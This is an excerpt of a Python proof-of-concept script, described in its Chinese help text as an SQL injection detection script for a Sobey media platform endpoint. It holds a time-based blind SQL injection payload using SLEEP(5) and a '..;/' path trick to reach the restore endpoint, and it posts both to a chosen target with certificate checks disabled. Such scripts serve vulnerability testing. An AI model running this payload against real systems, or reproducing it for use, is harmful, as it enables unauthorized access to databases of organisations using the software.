...
payload="siteCode=&id=1+AND+%28SELECT+2804+FROM+%28SELECT%28SLEEP%285%29%29%29MDfc%29&token="
link="/sobey-mchEditor/js/..;/mch/WXArticleInt/restore"

def poc(target):
    try:
        res1=requests.get(url=target,headers=headers,verify=False)
        if res1.status_code==200:
            res2=requests.post(url=target+link,headers=headers,data=payload,verify=False)
...
def main():
    ...
    parse=argparse.ArgumentParser(description="索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/restore SQL注入检测脚本")
